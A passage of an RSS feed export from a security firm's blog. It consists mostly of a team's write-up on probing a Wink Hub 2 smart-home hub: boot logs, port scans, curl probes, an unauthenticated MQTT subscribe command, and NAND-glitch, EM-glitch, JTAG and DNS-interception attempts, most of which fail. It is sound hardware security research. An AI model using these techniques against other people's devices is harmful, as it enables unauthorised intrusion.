      "content": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a quick look at Docker Desktop Extensions. Almost exactly a year after being announced, I wondered what the risks of a malicious docker extension could be. This is a writeup of what I learned, a few tricks I used to get some answers and how I found a &amp;#x201C;non-issue&amp;#x201D; command injection in the extensions SDK. Everything in this post was tested on macOS and Docker Desktop 4.19.0 (106363).\n\n",
      "contentSnippet": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a quick look at Docker Desktop Extensions. Almost exactly a year after being announced, I wondered what the risks of a malicious docker extension could be. This is a writeup of what I learned, a few tricks I used to get some answers and how I found a &#x201C;non-issue&#x201D; command injection in the extensions SDK. Everything in this post was tested on macOS and Docker Desktop 4.19.0 (106363).",
      "guid": "https://sensepost.com/blog/2023/an-offensive-look-at-docker-desktop-extensions/",
      "isoDate": "2023-05-30T07:24:42.000Z",
      "itunes": {}
    },
    {
      "title": "Investigating the Wink Hub 2",
      "link": "https://sensepost.com/blog/2023/investigating-the-wink-hub-2/",
      "pubDate": "Fri, 26 May 2023 10:40:21 +0000",
      "content:encoded": "<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-125.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"768\" src=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-125-1024x768.png\" alt=\"\" class=\"wp-image-66434\"></a><figcaption class=\"wp-element-caption\">Rogan brought half of his hardware parts bin to the hackathon!</figcaption></figure>\n\n\n\n<p>Michael Rodger, Daniel Scragg, Isak van der Walt, Thulani Mabuza and Rogan Dawes formed the Chubby Hackers team to investigate the Wink Hub 2 during SenseCon 2023. This was building on our project from SenseCon 2022 where we looked at the Wink Hub 1, particularly the various debug interfaces for the main i.MX28 and the peripheral radio controller chips. There is quite a lot of detailed information available online for the Wink Hub 1, but not a whole lot for the Wink Hub 2. In fact, there is practically nothing! We aimed to change that.</p>\n\n\n\n<p>Future unqualified references to &#x201C;the Hub&#x201D; will mean the Wink Hub 2, just for convenience.</p>\n\n\n\n<p>Opening the Hub is a relatively simple matter. The rubber pad underneath can be pulled off, as it is just press fit into some recesses.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-74.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"491\" src=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-74-1024x491.png\" alt=\"\" class=\"wp-image-65444\"></a><figcaption class=\"wp-element-caption\">The rubber pad underneath the hub simply peels off.</figcaption></figure>\n\n\n\n<p>Under the pad are two small screws holding the bottom part of the case to the rest of the case. </p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-75.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"259\" src=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-75-1024x259.png\" alt=\"\" class=\"wp-image-65447\"></a><figcaption class=\"wp-element-caption\">The weight that helps keep the hub upright might fall out the bottom!</figcaption></figure>\n\n\n\n<p>Pull the bottom off (watch out for the weight!), and then you can slide the two halves of the case in opposite directions to separate them. No spudgers are required!</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-76.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"666\" src=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-76-1024x666.png\" alt=\"\" class=\"wp-image-65449\"></a><figcaption class=\"wp-element-caption\">Pull the top cover down towards the base, about 4-5 mm, then lift it off.</figcaption></figure>\n\n\n\n<p>You can then unscrew four screws holding the PCB onto one half of the case, and access the component side of the board.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-77.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"1016\" src=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-77-1024x1016.png\" alt=\"\" class=\"wp-image-65451\"></a><figcaption class=\"wp-element-caption\">The rear of the Wink Hub 2 PCB.</figcaption></figure>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-78.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"997\" src=\"https://sensepost.com/img/pages/blog/2023/investigating-the-wink-hub-2/image-78-1024x997.png\" alt=\"\" class=\"wp-image-65452\"></a><figcaption class=\"wp-element-caption\">The front of the Wink Hub 2&#x2019;s PCB. i.MX6UL, flash and RAM under the upper metal cover, what looks like power supply parts under the lower metal cover.</figcaption></figure>\n\n\n\n<p>The Hub 2 looks quite similar to the Hub 1, with the various radio blocks arranged around the periphery of the PCB, and the debug or programming interfaces available as either through-hole pins or SMD pads. There is also the through hole UART for the i.MX6 main CPU and pads for the JTAG interface.</p>\n\n\n\n<p>We then soldered header pins for the i.MX6 UART, attached a USB-UART cable at 115200, and powered it on. The boot log can be found <a href=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-wink-hub-v2-boot-txt\" data-type=\"URL\" data-id=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-wink-hub-v2-boot-txt\" target=\"_blank\" rel=\"noreferrer noopener\">here</a>.</p>\n\n\n\n<p>A couple of things are worth noting immediately. Firstly, U-Boot does not allow you to interrupt the boot process, it proceeds immediately to run the boot scripts.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Hit any key to stop autoboot:  0 </code></pre>\n\n\n\n<p>Secondly, when it loads the next stage, you can see that Secure Boot and High Assurance Boot are enabled:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Loading from nand0, offset 0x3700000\n   Image Name:   Linux-3.14.52\n   Image Type:   ARM Linux Kernel Image (uncompressed)\n   Data Size:    49798474 Bytes = 47.5 MiB\n   Load Address: 80800000\n   Entry Point:  80800000\nSecure boot on, reading 49807392 bytes to get SRK data\n\nAuthenticate image from DDR location 0x80800000...\n\nSecure boot enabled\n\nHAB Configuration: 0xcc, HAB State: 0x99\nNo HAB Events Found!</code></pre>\n\n\n\n<p>It takes quite a long time to read the 47.5MB and verify it. That corresponds to the full &#x201C;app&#x201D; partition, which includes the kernel.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>5 cmdlinepart partitions found on MTD device gpmi-nand\nCreating 5 MTD partitions on &quot;gpmi-nand&quot;:\n0x000000000000-0x000000300000 : &quot;boot&quot;\n0x000000300000-0x000002300000 : &quot;updater&quot;\n0x000002300000-0x000002d00000 : &quot;database&quot;\n0x000002d00000-0x000003700000 : &quot;dbBackup&quot;\n0x000003700000-0x000008000000 : &quot;app&quot;</code></pre>\n\n\n\n<p>At this point, it&#x2019;s worth understanding exactly what we are dealing with. I found a document from NXP describing <a rel=\"noreferrer noopener\" href=\"https://community.nxp.com/pwmxy87654/attachments/pwmxy87654/imx-processors/60046/1/i.MX_6_Linux_High_Assurance_Boot_(HAB)_User&apos;s_Guide.pdf\" target=\"_blank\">High Assurance Boot</a>. There is also a nice <a rel=\"noreferrer noopener\" href=\"https://variwiki.com/index.php?title=High_Assurance_Boot\" data-type=\"URL\" data-id=\"https://variwiki.com/index.php?title=High_Assurance_Boot\" target=\"_blank\">overview</a> by a board manufacturer. In essence, an asymmetric key pair is generated, which will be used to sign any code images to be executed. The hash of the public key is permanently burned into fuses in the i.MX6 CPU, and the boot ROM routines will validate the signature attached to the U-Boot boot image before executing it. U-Boot then validates the signature of the app and updater partitions before executing any code from them. The updater partition is a fall back Linux installation which is used when new firmware images are made available by the manufacturer. To tell U-Boot whether to boot the app or updater partitions, it checks for a file called DO_UPDATE in the database partition:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Loading file &apos;DO_UPDATE&apos; to addr 0x83000000 with size 1 (0x00000001)...\nDone\nTotal of 1 word(s) were the same</code></pre>\n\n\n\n<p>Based on (my recollection of) previous analysis of the Hub 1, if there is a 1 in that file, it will start the update process, otherwise it will run the primary app partition. It&#x2019;s not really important at this stage, as we have no real way to influence this!</p>\n\n\n\n<p>The last thing that is worth noting about the boot log in this initial analysis is that there is no shell or login prompt at the end of it. So, no way to interact with the Hub via the UART. Fortunately, we can still get some output indicating what is going on internally, so we&#x2019;ll keep the UART attached.</p>\n\n\n\n<p>At this point, the Hub is booted, and with no Ethernet cable connected or WiFi credentials configured, it has started its own WiFi AP to allow the user to set it up.</p>\n\n\n\n<p>We configured our router to block any internet traffic from the Hub, then connected the Hub with an Ethernet cable. A quick nmap scan later, and we get the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Not shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE                 REASON         VERSION\n80/tcp   open  http                    syn-ack ttl 64\n1883/tcp open  mosquitto version 1.4.8 syn-ack ttl 64\n8886/tcp open  unknown                 syn-ack ttl 64\n8888/tcp open  ssl/sun-answerbook?     syn-ack ttl 64</code></pre>\n\n\n\n<p>Full nmap scan output can be found <a href=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-primary-app-port-scan-nmap\" data-type=\"URL\" data-id=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-primary-app-port-scan-nmap\" target=\"_blank\" rel=\"noreferrer noopener\">here, including service fingerprints</a>.</p>\n\n\n\n<p>Port 80, 8886 and 8888 are HTTP servers (8888 over SSL using a self-signed certificate). They don&#x2019;t seem to have any user-facing applications on them, rather being intended to allow external mobile applications to interact with them.</p>\n\n\n\n<pre class=\"wp-block-code\"><code># curl -i http://192.168.254.226/\nHTTP/1.1 200 OK\ncontent-type: application/json\ncontent-length: 255\nDate: Tue, 30 May 2023 07:01:05 GMT\nConnection: keep-alive\n\n{&quot;winkState&quot;:&quot;NOC-NotConnected&quot;,&quot;networkState&quot;:&quot;CON-Internet&quot;,&quot;lastNetFailure&quot;:null,&quot;lastWinkFailure&quot;:null,&quot;acceptingWifiConfig&quot;:true,&quot;acceptingCreds&quot;:true,&quot;haveEthConn&quot;:true,&quot;haveWifiCreds&quot;:false,&quot;bundleId&quot;:&quot;None&quot;,&quot;fwVer&quot;:&quot;4.4.1-0-g5167f88bfd-hub2-app&quot;}</code></pre>\n\n\n\n<pre class=\"wp-block-code\"><code># curl -i http://192.168.254.226:8886/\nHTTP/1.1 200 OK\ncontent-length: 20\nDate: Thu, 01 Jan 1970 01:41:14 GMT\nConnection: keep-alive\n\nAAU Heartbeat Server</code></pre>\n\n\n\n<pre class=\"wp-block-code\"><code># curl -i -k https://192.168.254.226:8888/\nHTTP/1.1 200 OK\ncontent-length: 824\nDate: Thu, 01 Jan 1970 01:40:36 GMT\nConnection: keep-alive\n\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;root xmlns=&quot;urn:schemas-wink-com:device-1-0&quot;&gt;\n&lt;specVersion&gt;\n&lt;major&gt;1&lt;/major&gt;\n&lt;minor&gt;0&lt;/minor&gt;\n&lt;/specVersion&gt;\n&lt;URLBase&gt;https://192.168.254.226:8888&lt;/URLBase&gt;\n&lt;device&gt;\n&lt;deviceType&gt;urn:wink-com:device:hub2:2&lt;/deviceType&gt;\n&lt;friendlyName&gt;Wink Hub 2&lt;/friendlyName&gt;\n&lt;manufacturer&gt;Wink, Inc.&lt;/manufacturer&gt;\n&lt;manufacturerURL&gt;http://www.wink.com&lt;/manufacturerURL&gt;\n&lt;modelDescription&gt;Wink Hub 2&lt;/modelDescription&gt;\n&lt;modelName&gt;Wink Hub 2&lt;/modelName&gt;\n&lt;modelNumber/&gt;\n&lt;modelURL&gt;http://www.wink.com&lt;/modelURL&gt;\n&lt;serialNumber/&gt;\n&lt;UDN&gt;uuid:b540dc21-da92-4b84-b70b-2d2e1ae7fb13&lt;/UDN&gt;\n&lt;UPC/&gt;\n&lt;iconList/&gt;\n&lt;presentationURL/&gt;\n&lt;serviceList&gt;\n&lt;service&gt;\n&lt;serviceType&gt;urn:wink-com:service:fasterLights:2&lt;/serviceType&gt;\n&lt;serviceId&gt;urn:wink-com:serviceId:fasterLights&lt;/serviceId&gt;\n&lt;controlURL/&gt;\n&lt;/service&gt;\n&lt;/serviceList&gt;\n&lt;/device&gt;\n&lt;/root&gt;</code></pre>\n\n\n\n<p>Port 1883 is cleartext MQTT, and it is possible to connect without any authentication, and subscribe to the root topic:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>mosquitto_sub -h 192.168.1.226 -t &apos;#&apos;</code></pre>\n\n\n\n<p>Unfortunately, since the Hub was not configured, and had no devices linked to it, there was no traffic observed. It&#x2019;s possible that there may be some application on the Hub that is listening to a particular topic, and might pass data received to a command line program. If we could get the firmware off, it would be worth investigating!</p>\n\n\n\n<p>We wanted to check that the <a href=\"https://www.exploitee.rs/index.php/Wink_Hub%E2%80%8B%E2%80%8B#NAND_Glitch_Method_(Works_on_any_Wink_Hub_FW)\" data-type=\"URL\" data-id=\"https://www.exploitee.rs/index.php/Wink_Hub%E2%80%8B%E2%80%8B#NAND_Glitch_Method_(Works_on_any_Wink_Hub_FW)\" target=\"_blank\" rel=\"noreferrer noopener\">known glitch attack</a> had been properly addressed, so we pried the top of the metal shield off the CPU (and RAM and flash). We tried shorting one of the data pins to ground while U-Boot was loading and verifying the app partition. As expected, the signature verification failed, and it fell back to booting from the updater partition.  Here is the relevant <a rel=\"noreferrer noopener\" href=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-wink-hub-v2-updater-boot-txt\" data-type=\"URL\" data-id=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-wink-hub-v2-updater-boot-txt\" target=\"_blank\">boot log output</a>.</p>\n\n\n\n<p>When the system was booted from the updater partition, nmap showed the same services open, apart from the MQTT service on port 1883.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Not shown: 65532 closed ports\nReason: 65532 resets\nPORT     STATE SERVICE        REASON\n80/tcp   open  http           syn-ack ttl 64\n8886/tcp open  unknown        syn-ack ttl 64\n8888/tcp open  sun-answerbook syn-ack ttl 64\nMAC Address: 00:21:CC:4B:F1:1D (Flextronics International)</code></pre>\n\n\n\n<p>Continuing to hold the data pin to ground while the updater partition was verified (so no messing with that one either!) resulted in the Hub simply ending up resetting and starting again. Detailed logs available <a href=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-wink-hub-v2-glitch-fail-to-boot-txt\" data-type=\"URL\" data-id=\"https://gist.github.com/RoganDawes/aba4b2bb62860c35832a388e7efeb3dc#file-wink-hub-v2-glitch-fail-to-boot-txt\" target=\"_blank\" rel=\"noreferrer noopener\">here</a>.</p>\n\n\n\n<p>The next attack we wanted to try was to intercept traffic from the Hub to the Internet. We could see it doing DNS lookups for hub-updates.winkapp.com, so we configured our DNS server to return a local address, and ran an SSL listener on port 443. Unfortunately, as soon as it connected and negotiated an SSL connection, it disconnected, printing an error message to the UART console.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>curl: (90) SSL: public key does not match pinned public key!\ndate: invalid date &apos;Error:-bad-date format&apos;</code></pre>\n\n\n\n<p>Looking up that error message, it turns out that curl has an option to check the certificate against the hash of the certificate:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>--pinnedpubkey &lt;hashes&gt;\n       (TLS) Tells curl to use the specified public key file (or hashes) to\n       verify the peer. This can be a path to a file which contains a single\n       public key in PEM or DER format, or any number of base64 encoded\n       sha256 hashes preceded by &apos;sha256//&apos; and separated by &apos;;&apos;.\n\n       When negotiating a TLS or SSL connection, the server sends a\n       certificate indicating its identity. A public key is extracted from\n       this certificate and if it does not exactly match the public key\n       provided to this option, curl will abort the connection before\n       sending or receiving any data.</code></pre>\n\n\n\n<p>Since it is verifying using a hash of the public key, there is no opportunity to try fake the certificate by cloning it with <a rel=\"noreferrer noopener\" href=\"https://github.com/SensePost/Apostille\" data-type=\"URL\" data-id=\"https://github.com/SensePost/Apostille\" target=\"_blank\">Apostille</a>. It&#x2019;s also worth noting the error message following &#x2013; the Hub appears to be trying to set the date and time by connecting to their server, even though the NTP service is also running. (This is the same behaviour as the Wink Hub 1.)</p>\n\n\n\n<p>Since we were making no forward progress, Michael decided to solder a JTAG header onto the board, and see what could be seen. After a couple of false starts with flaky cables that halted the CPU (even when nothing else was connected to it!) we managed to connect Michael&#x2019;s Tigard and try to connect using OpenOCD. Unfortunately, as soon as OpenOCD started talking to the CPU, it simply halted, and refused to proceed.</p>\n\n\n\n<p>Next, we attempted to delve into Colin O&#x2019;Flynn&#x2019;s magical world of glitching with the <a href=\"https://github.com/newaetech/chipshouter-picoemp\">PicoEMP</a>. The idea behind this is to introduce interference inside the chip through the use of high-voltage electro-magnetic pulses. Due to the physical nature of the attack, results will vary widely depending on the execution state of the processor as well as where and how close you aim. It&#x2019;s &#x2026; not an exact science (as a handheld device). A few attempts in every position allowed by the shield, produced no results. Eventually, we realised that in a certain position, the CPU would halt execution. Our excitement was short-lived as we quickly realised that the &#x201C;glitch&#x201D; was introduced before even triggering the PicoEMP and that the fault was in fact coming from shorting out contacts on the board with the ferrite core of the PicoEMP.</p>\n\n\n\n<p>We also noted that there was a footprint for a Micro-USB connector on the board, which appears to be <a rel=\"noreferrer noopener\" href=\"https://za.rs-online.com/web/p/usb-connectors/8967572\" data-type=\"URL\" data-id=\"https://za.rs-online.com/web/p/usb-connectors/8967572\" target=\"_blank\">this</a> one. Since we didn&#x2019;t have any on hand, Michael decided to solder directly to the (extremely fine pitch) pads, using magnet wire, and then connecting that to a donor USB cable. After a few false starts when the magnet wire decided not to stick, I was able to plug the USB cable into a sacrificial USB host (in case the pinouts were wrong), and look to see if there was any attempt to enumerate. Interestingly, the power supplied by the USB port was enough to power up the Hub, as seen by messages on the UART. Unfortunately, there was no sign of any enumeration.</p>\n\n\n\n<p>Thinking that it might be that the CPU would fall back to USB if it was unable to communicate with the flash chip, we tried pulling the CE# (Chip Enable) and RE# (Read Enable) pins low, first via 470Ohm resistor, but eventually via a direct wire. It was only when using the wire that we noticed any effect &#x2013; basically it failed to even start. It is likely that we will need to alter a strapping resistor to tell it to try and boot from USB &#x2013; actually finding that will be a fun exercise with no schematic or board level diagram! There was no switch on board to do it for us, unfortunately! (Although in retrospect, there is a button labeled SW3 that we didn&#x2019;t explore!). After the fact, I realised that there are two test points adjacent to the USB connector footprint, and these are connected to the D- and D+ USB signals. No need for the super fine soldering work! One might even be able to make a pogo-pin adapter, taking Vcc and Ground connections from elsewhere on the board!</p>\n\n\n\n<p>At this point, we started wrapping up our investigation as we were running out of time. Ideas for future exploration include:</p>\n\n\n\n<ul>\n<li>Investigating how the Android Wink Application locates and provisions the Wink Hub, setting WiFi credentials, etc.</li>\n\n\n\n<li>Allowing the first curl connection to succeed, and let the Hub get the time. Keeping track of how many bytes are downloaded is probably a good idea, and terminating the connection if it looks like it is downloading a new partition image would probably be wise. Then intercepting future requests after that, until we see some interesting network behaviour. Hopefully! </li>\n\n\n\n<li>Buying another Hub 2, and using hot air to remove the flash chip, and take an image of it. Then, reviewing the various partitions for any possible vulnerabilities that could result in code execution. The exploit itself would need to be stored on the unverified database or database backup partitions, of course, otherwise the partition signature checks will fail.</li>\n\n\n\n<li>Trying to find the strapping resistor to get the Hub to boot from USB. This might be a dead end due to the High Assurance Boot, but NCC Group did find a <a href=\"https://research.nccgroup.com/2022/11/17/cve-2022-45163/\" data-type=\"URL\" data-id=\"https://research.nccgroup.com/2022/11/17/cve-2022-45163/\" target=\"_blank\" rel=\"noreferrer noopener\">vulnerability in the i.MX6 CPU</a> that might be relevant.</li>\n</ul>\n",
      "content:encodedSnippet": "Rogan brought half of his hardware parts bin to the hackathon!\n\n\n\nMichael Rodger, Daniel Scragg, Isak van der Walt, Thulani Mabuza and Rogan Dawes formed the Chubby Hackers team to investigate the Wink Hub 2 during SenseCon 2023. This was building on our project from SenseCon 2022 where we looked at the Wink Hub 1, particularly the various debug interfaces for the main i.MX28 and the peripheral radio controller chips. There is quite a lot of detailed information available online for the Wink Hub 1, but not a whole lot for the Wink Hub 2. In fact, there is practically nothing! We aimed to change that.\nFuture unqualified references to “the Hub” will mean the Wink Hub 2, just for convenience.\nOpening the Hub is a relatively simple matter. The rubber pad underneath can be pulled off, as it is just press fit into some recesses.\nThe rubber pad underneath the hub simply peels off.\n\n\n\nUnder the pad are two small screws holding the bottom part of the case to the rest of the case. \nThe weight that helps keep the hub upright might fall out the bottom!\n\n\n\nPull the bottom off (watch out for the weight!), and then you can slide the two halves of the case in opposite directions to separate them. No spudgers are required!\nPull the top cover down towards the base, about 4-5 mm, then lift it off.\n\n\n\nYou can then unscrew four screws holding the PCB onto one half of the case, and access the component side of the board.\nThe rear of the Wink Hub 2 PCB.\n\n\n\nThe front of the Wink Hub 2’s PCB. i.MX6UL, flash and RAM under the upper metal cover, what looks like power supply parts under the lower metal cover.\n\n\n\nThe Hub 2 looks quite similar to the Hub 1, with the various radio blocks arranged around the periphery of the PCB, and the debug or programming interfaces available as either through-hole pins or SMD pads. There is also the through hole UART for the i.MX6 main CPU and pads for the JTAG interface.\nWe then soldered header pins for the i.MX6 UART, attached a USB-UART cable at 115200, and powered it on. The boot log can be found here.\nA couple of things are worth noting immediately. Firstly, U-Boot does not allow you to interrupt the boot process, it proceeds immediately to run the boot scripts.\nHit any key to stop autoboot:  0 \nSecondly, when it loads the next stage, you can see that Secure Boot and High Assurance Boot are enabled:\nLoading from nand0, offset 0x3700000\n   Image Name:   Linux-3.14.52\n   Image Type:   ARM Linux Kernel Image (uncompressed)\n   Data Size:    49798474 Bytes = 47.5 MiB\n   Load Address: 80800000\n   Entry Point:  80800000\nSecure boot on, reading 49807392 bytes to get SRK data\n\nAuthenticate image from DDR location 0x80800000...\n\nSecure boot enabled\n\nHAB Configuration: 0xcc, HAB State: 0x99\nNo HAB Events Found!\nIt takes quite a long time to read the 47.5MB and verify it. That corresponds to the full “app” partition, which includes the kernel.\n5 cmdlinepart partitions found on MTD device gpmi-nand\nCreating 5 MTD partitions on \"gpmi-nand\":\n0x000000000000-0x000000300000 : \"boot\"\n0x000000300000-0x000002300000 : \"updater\"\n0x000002300000-0x000002d00000 : \"database\"\n0x000002d00000-0x000003700000 : \"dbBackup\"\n0x000003700000-0x000008000000 : \"app\"\nAt this point, it’s worth understanding exactly what we are dealing with. I found a document from NXP describing High Assurance Boot. There is also a nice overview by a board manufacturer. In essence, an asymmetric key pair is generated, which will be used to sign any code images to be executed. The hash of the public key is permanently burned into fuses in the i.MX6 CPU, and the boot ROM routines will validate the signature attached to the U-Boot boot image before executing it. U-Boot then validates the signature of the app and updater partitions before executing any code from them. The updater partition is a fall back Linux installation which is used when new firmware images are made available by the manufacturer. To tell U-Boot whether to boot the app or updater partitions, it checks for a file called DO_UPDATE in the database partition:\nLoading file 'DO_UPDATE' to addr 0x83000000 with size 1 (0x00000001)...\nDone\nTotal of 1 word(s) were the same\nBased on (my recollection of) previous analysis of the Hub 1, if there is a 1 in that file, it will start the update process, otherwise it will run the primary app partition. It’s not really important at this stage, as we have no real way to influence this!\nThe last thing that is worth noting about the boot log in this initial analysis is that there is no shell or login prompt at the end of it. So, no way to interact with the Hub via the UART. Fortunately, we can still get some output indicating what is going on internally, so we’ll keep the UART attached.\nAt this point, the Hub is booted, and with no Ethernet cable connected or WiFi credentials configured, it has started its own WiFi AP to allow the user to set it up.\nWe configured our router to block any internet traffic from the Hub, then connected the Hub with an Ethernet cable. A quick nmap scan later, and we get the following:\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE                 REASON         VERSION\n80/tcp   open  http                    syn-ack ttl 64\n1883/tcp open  mosquitto version 1.4.8 syn-ack ttl 64\n8886/tcp open  unknown                 syn-ack ttl 64\n8888/tcp open  ssl/sun-answerbook?     syn-ack ttl 64\nFull nmap scan output can be found here, including service fingerprints.\nPort 80, 8886 and 8888 are HTTP servers (8888 over SSL using a self-signed certificate). They don’t seem to have any user-facing applications on them, rather being intended to allow external mobile applications to interact with them.\n# curl -i http://192.168.254.226/\nHTTP/1.1 200 OK\ncontent-type: application/json\ncontent-length: 255\nDate: Tue, 30 May 2023 07:01:05 GMT\nConnection: keep-alive\n\n{\"winkState\":\"NOC-NotConnected\",\"networkState\":\"CON-Internet\",\"lastNetFailure\":null,\"lastWinkFailure\":null,\"acceptingWifiConfig\":true,\"acceptingCreds\":true,\"haveEthConn\":true,\"haveWifiCreds\":false,\"bundleId\":\"None\",\"fwVer\":\"4.4.1-0-g5167f88bfd-hub2-app\"}\n# curl -i http://192.168.254.226:8886/\nHTTP/1.1 200 OK\ncontent-length: 20\nDate: Thu, 01 Jan 1970 01:41:14 GMT\nConnection: keep-alive\n\nAAU Heartbeat Server\n# curl -i -k https://192.168.254.226:8888/\nHTTP/1.1 200 OK\ncontent-length: 824\nDate: Thu, 01 Jan 1970 01:40:36 GMT\nConnection: keep-alive\n\n<?xml version=\"1.0\"?>\n<root xmlns=\"urn:schemas-wink-com:device-1-0\">\n<specVersion>\n<major>1</major>\n<minor>0</minor>\n</specVersion>\n<URLBase>https://192.168.254.226:8888</URLBase>\n<device>\n<deviceType>urn:wink-com:device:hub2:2</deviceType>\n<friendlyName>Wink Hub 2</friendlyName>\n<manufacturer>Wink, Inc.</manufacturer>\n<manufacturerURL>http://www.wink.com</manufacturerURL>\n<modelDescription>Wink Hub 2</modelDescription>\n<modelName>Wink Hub 2</modelName>\n<modelNumber/>\n<modelURL>http://www.wink.com</modelURL>\n<serialNumber/>\n<UDN>uuid:b540dc21-da92-4b84-b70b-2d2e1ae7fb13</UDN>\n<UPC/>\n<iconList/>\n<presentationURL/>\n<serviceList>\n<service>\n<serviceType>urn:wink-com:service:fasterLights:2</serviceType>\n<serviceId>urn:wink-com:serviceId:fasterLights</serviceId>\n<controlURL/>\n</service>\n</serviceList>\n</device>\n</root>\nPort 1883 is cleartext MQTT, and it is possible to connect without any authentication, and subscribe to the root topic:\nmosquitto_sub -h 192.168.1.226 -t '#'\nUnfortunately, since the Hub was not configured, and had no devices linked to it, there was no traffic observed. It’s possible that there may be some application on the Hub that is listening to a particular topic, and might pass data received to a command line program. If we could get the firmware off, it would be worth investigating!\nWe wanted to check that the known glitch attack had been properly addressed, so we pried the top of the metal shield off the CPU (and RAM and flash). We tried shorting one of the data pins to ground while U-Boot was loading and verifying the app partition. As expected, the signature verification failed, and it fell back to booting from the updater partition.  Here is the relevant boot log output.\nWhen the system was booted from the updater partition, nmap showed the same services open, apart from the MQTT service on port 1883.\nNot shown: 65532 closed ports\nReason: 65532 resets\nPORT     STATE SERVICE        REASON\n80/tcp   open  http           syn-ack ttl 64\n8886/tcp open  unknown        syn-ack ttl 64\n8888/tcp open  sun-answerbook syn-ack ttl 64\nMAC Address: 00:21:CC:4B:F1:1D (Flextronics International)\nContinuing to hold the data pin to ground while the updater partition was verified (so no messing with that one either!) resulted in the Hub simply ending up resetting and starting again. Detailed logs available here.\nThe next attack we wanted to try was to intercept traffic from the Hub to the Internet. We could see it doing DNS lookups for hub-updates.winkapp.com, so we configured our DNS server to return a local address, and ran an SSL listener on port 443. Unfortunately, as soon as it connected and negotiated an SSL connection, it disconnected, printing an error message to the UART console.\ncurl: (90) SSL: public key does not match pinned public key!\ndate: invalid date 'Error:-bad-date format'\nLooking up that error message, it turns out that curl has an option to check the certificate against the hash of the certificate:\n--pinnedpubkey <hashes>\n       (TLS) Tells curl to use the specified public key file (or hashes) to\n       verify the peer. This can be a path to a file which contains a single\n       public key in PEM or DER format, or any number of base64 encoded\n       sha256 hashes preceded by 'sha256//' and separated by ';'.\n\n       When negotiating a TLS or SSL connection, the server sends a\n       certificate indicating its identity. A public key is extracted from\n       this certificate and if it does not exactly match the public key\n       provided to this option, curl will abort the connection before\n       sending or receiving any data.\nSince it is verifying using a hash of the public key, there is no opportunity to try fake the certificate by cloning it with Apostille. It’s also worth noting the error message following – the Hub appears to be trying to set the date and time by connecting to their server, even though the NTP service is also running. (This is the same behaviour as the Wink Hub 1.)\nSince we were making no forward progress, Michael decided to solder a JTAG header onto the board, and see what could be seen. After a couple of false starts with flaky cables that halted the CPU (even when nothing else was connected to it!) we managed to connect Michael’s Tigard and try to connect using OpenOCD. Unfortunately, as soon as OpenOCD started talking to the CPU, it simply halted, and refused to proceed.\nNext, we attempted to delve into Colin O’Flynn’s magical world of glitching with the PicoEMP. The idea behind this is to introduce interference inside the chip through the use of high-voltage electro-magnetic pulses. Due to the physical nature of the attack, results will vary widely depending on the execution state of the processor as well as where and how close you aim. It’s … not an exact science (as a handheld device). A few attempts in every position allowed by the shield, produced no results. Eventually, we realised that in a certain position, the CPU would halt execution. Our excitement was short-lived as we quickly realised that the “glitch” was introduced before even triggering the PicoEMP and that the fault was in fact coming from shorting out contacts on the board with the ferrite core of the PicoEMP.\nWe also noted that there was a footprint for a Micro-USB connector on the board, which appears to be this one. Since we didn’t have any on hand, Michael decided to solder directly to the (extremely fine pitch) pads, using magnet wire, and then connecting that to a donor USB cable. After a few false starts when the magnet wire decided not to stick, I was able to plug the USB cable into a sacrificial USB host (in case the pinouts were wrong), and look to see if there was any attempt to enumerate. Interestingly, the power supplied by the USB port was enough to power up the Hub, as seen by messages on the UART. Unfortunately, there was no sign of any enumeration.\nThinking that it might be that the CPU would fall back to USB if it was unable to communicate with the flash chip, we tried pulling the CE# (Chip Enable) and RE# (Read Enable) pins low, first via 470Ohm resistor, but eventually via a direct wire. It was only when using the wire that we noticed any effect – basically it failed to even start. It is likely that we will need to 